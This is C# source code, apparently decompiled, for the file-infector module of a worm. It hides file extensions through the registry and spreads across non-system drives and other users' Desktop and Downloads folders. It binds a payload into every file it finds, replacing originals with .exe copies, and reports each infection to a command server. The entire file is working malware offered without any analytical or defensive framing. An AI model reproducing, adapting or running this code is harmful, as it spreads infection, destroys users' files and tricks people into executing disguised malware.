using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Leb128;
using Microsoft.Win32;
using Plugin.Helper;

namespace Worm2.Files;

internal class Infector
{
	public static void Run()
	{
		Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", 1, RegistryValueKind.DWord);
		List<Thread> threads = new List<Thread>();
		Environment.GetLogicalDrives().ToList().ForEach(delegate(string drivers)
		{
			if (!drivers.Contains("C"))
			{
				threads.Add(new Thread((ThreadStart)delegate
				{
					JoinerInDir(drivers);
				}));
			}
		});
		string[] directories = Directory.GetDirectories("C:\\Users");
		foreach (string profiles in directories)
		{
			try
			{
				if (profiles == Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
				{
					continue;
				}
				if (File.Exists(Path.Combine(profiles, "Desktop")))
				{
					threads.Add(new Thread((ThreadStart)delegate
					{
						JoinerInDir(Path.Combine(profiles, "Desktop"));
					}));
				}
				if (File.Exists(Path.Combine(profiles, "Download")))
				{
					threads.Add(new Thread((ThreadStart)delegate
					{
						JoinerInDir(Path.Combine(profiles, "Downloads"));
					}));
				}
			}
			catch
			{
			}
		}
		foreach (Thread item in threads)
		{
			item.Start();
		}
		foreach (Thread item2 in threads)
		{
			item2.Join();
		}
	}

	public static void Join(string file)
	{
		try
		{
			string extension = Path.GetExtension(file);
			byte[] array = Joiner.Compiler(File.ReadAllBytes(file), extension);
			if (array != null)
			{
				if (extension == ".exe")
				{
					File.WriteAllBytes(file, array);
				}
				else
				{
					File.WriteAllBytes(file + ".exe", array);
					File.Delete(file);
				}
				if (file.Contains("\\\\"))
				{
					Client.Send(LEB128.Write(new object[2]
					{
						"WormLog1",
						"File infected: " + file
					}));
				}
				else
				{
					Client.Send(LEB128.Write(new object[2]
					{
						"WormLog",
						"File infected: " + file
					}));
				}
			}
		}
		catch
		{
		}
	}

	public static void JoinerInDir(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir, "*.*");
			foreach (string file in files)
			{
				try
				{
					Join(file);
				}
				catch
				{
				}
			}
			files = Directory.GetDirectories(sDir);
			foreach (string d in files)
			{
				try
				{
					new Thread((ThreadStart)delegate
					{
						JoinerInDir(d);
					}).Start();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
